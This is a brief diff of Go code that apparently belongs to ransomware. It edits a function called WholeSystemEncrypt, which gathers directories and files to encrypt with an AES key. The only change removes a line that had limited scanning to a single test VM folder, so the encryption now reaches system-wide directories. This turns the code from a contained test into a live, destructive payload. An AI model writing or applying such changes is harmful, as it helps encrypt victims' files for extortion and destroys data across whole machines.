@@ -29,7 +29,6 @@ func WholeSystemEncrypt(aesKey []byte, encryptedAesKey []byte) {
 	timeNow := time.Now()
 
 	dirsToScan = generateListOfDirsToScan(dirsToScan, dirsToRemove)
-	dirsToScan = []string{"/run/media/dejan/AMD/vm/"}
 	pl("dirsToScan: ", dirsToScan)
 
 	//listen for channel and append to filesToEncrypt
